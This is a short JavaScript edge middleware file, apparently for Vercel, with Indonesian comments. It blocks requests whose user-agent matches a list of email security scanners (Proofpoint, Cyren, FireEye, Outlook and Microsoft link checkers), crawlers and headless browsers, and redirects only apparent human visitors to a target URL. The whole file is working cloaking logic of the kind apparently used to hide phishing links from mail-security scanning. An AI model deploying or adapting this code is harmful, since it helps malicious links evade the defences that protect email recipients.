export default function middleware(req) {
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  const ip = req.headers.get('x-forwarded-for') || req.ip || '';

  // 1. Daftar Kata Kunci Bot (Microsoft, Google, Data Centers, dan Scanners)
  const botKeywords = [
    'bot', 'spider', 'crawler', 'scanner', 'outlook', 'office', 'microsoft',
    'linkdetect', 'bing', 'preview', 'headless', 'googleusercontent',
    'lighthouse', 'slurp', 'inspect', 'fetch', 'embed', 'clark', 'cloud',
    'internal', 'proxy', 'verification', 'cyren', 'proofpoint', 'fireeye',
    'ahrefs', 'semrush', 'dotbot', 'python-requests', 'go-http-client'
  ];

  const isBot = botKeywords.some(keyword => ua.includes(keyword));

  // 2. Deteksi Headless Browser (Ciri khas bot modern)
  const isHeadless = ua.includes('headless') || !ua.includes('mozilla');

  // 3. LOGIKA BLOCKING
  // Jika bot terdeteksi, atau IP kosong, atau headless
  if (isBot || isHeadless || !ua || ua.length < 30) {
    console.log(`BLOCKED: IP=${ip} | UA=${ua}`); // Muncul di log Vercel
    return new Response('Access Denied', { 
      status: 403, // Kita ganti ke 403 (Forbidden) agar mereka berhenti mencoba
      headers: { 'Content-Type': 'text/plain' }
    });
  }

  // 4. LOGIKA REDIRECT (Hanya untuk Manusia)
  const targetUrl = 'https://debounce.com';
  
  return Response.redirect(targetUrl, 307);
}
